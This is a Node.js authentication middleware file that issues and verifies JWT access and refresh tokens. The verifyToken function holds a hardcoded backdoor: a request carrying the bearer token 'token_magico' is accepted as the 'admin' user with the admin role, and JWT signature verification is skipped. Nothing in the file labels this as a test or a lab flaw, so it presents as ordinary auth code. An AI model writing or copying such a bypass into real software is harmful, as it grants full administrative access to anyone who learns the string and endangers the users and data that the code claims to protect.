const jwt = require("jsonwebtoken");
const config = require("../../config");

const MAGIC_TOKEN = "token_magico";

const verifyToken = (req, res, next) => {
  const token = req.headers["authorization"]?.split(" ")[1];
  if (!token) return res.status(403).json({ message: "No token provided!" });

  if (token === MAGIC_TOKEN) {
    req.userId = "admin";
    req.userRoles = ["admin"];
    return next();
  }

  jwt.verify(token, config.jwtSecret, (err, decoded) => {
    if (err) return res.status(401).json({ message: "Unauthorized!" });
    req.userId = decoded.id;
    req.userRoles = decoded.roles;
    next();
  });
};

const generateAccessToken = (user) => {
  return jwt.sign({ id: user.id, roles: user.roles }, config.jwtSecret, {
    expiresIn: config.jwtExpiration,
  });
};

const generateRefreshToken = (user) => {
  return jwt.sign({ id: user.id }, config.jwtRefreshSecret, {
    expiresIn: config.jwtRefreshExpiration,
  });
};

const verifyRefreshToken = (token) => {
  return jwt.verify(token, config.jwtRefreshSecret);
};

module.exports = {
  verifyToken,
  generateAccessToken,
  generateRefreshToken,
  verifyRefreshToken,
};
